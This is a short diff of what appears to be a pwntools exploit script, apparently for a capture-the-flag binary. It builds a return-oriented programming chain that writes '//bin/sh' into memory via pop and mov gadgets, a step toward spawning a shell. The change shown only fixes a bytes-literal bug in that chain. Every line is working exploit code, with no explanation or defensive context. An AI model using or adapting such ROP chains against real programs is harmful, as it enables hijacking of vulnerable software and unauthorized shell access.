@@ -10,7 +10,7 @@ rebase_0 = lambda x : p64(x + binary.address)
 rop = b''
 
 rop += rebase_0(0x00000000000118f8) # 0x00000000004118f8: pop r13; ret;
-rop += '//bin/sh'
+rop += b'//bin/sh'
 rop += rebase_0(0x0000000000001f9b) # 0x0000000000401f9b: pop rbx; ret;
 rop += rebase_0(0x00000000000c00e0)
 rop += rebase_0(0x0000000000084395) # 0x0000000000484395: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
